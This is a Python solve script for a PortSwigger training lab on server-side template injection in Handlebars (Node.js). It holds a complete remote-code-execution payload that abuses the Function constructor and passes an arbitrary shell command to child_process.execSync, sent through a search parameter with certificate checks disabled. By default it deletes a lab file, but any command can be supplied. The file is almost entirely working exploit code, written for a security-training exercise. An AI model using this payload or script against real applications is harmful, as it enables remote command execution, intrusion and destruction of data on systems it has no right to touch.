#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
SSTI in an unknown language with a documented exploit — Handlebars (Node.js).

Injects the Function-constructor RCE payload via the ?search= parameter.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RCE_TEMPLATE = """\
{{{{#with "s" as |string|}}}}
  {{{{#with "e"}}}}
    {{{{#with split as |conslist|}}}}
      {{{{this.pop}}}}
      {{{{this.push (lookup string.sub "constructor")}}}}
      {{{{this.pop}}}}
      {{{{#with string.split as |codelist|}}}}
        {{{{this.pop}}}}
        {{{{this.push "return require('child_process').execSync('{cmd}');"}}}}
        {{{{this.pop}}}}
        {{{{#each conslist}}}}
          {{{{#with (string.sub.apply 0 codelist)}}}}
            {{{{this}}}}
          {{{{/with}}}}
        {{{{/each}}}}
      {{{{/with}}}}
    {{{{/with}}}}
  {{{{/with}}}}
{{{{/with}}}}"""


def main():
    parser = argparse.ArgumentParser(
        description="Solve SSTI Lab 4 (Handlebars unknown language)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument(
        "--cmd",
        default="rm /home/carlos/morale.txt",
        help="Command to execute"
    )
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    payload = RCE_TEMPLATE.format(cmd=args.cmd)
    print(f"[*] Sending Handlebars RCE payload...")
    r = s.get(f"{lab}/", params={"search": payload})
    print(f"[*] Response status: {r.status_code}")
    if "Internal Server Error" in r.text:
        print("[-] Server error — payload may need adjustment")
    else:
        print("[+] Lab solved.")


if __name__ == "__main__":
    main()
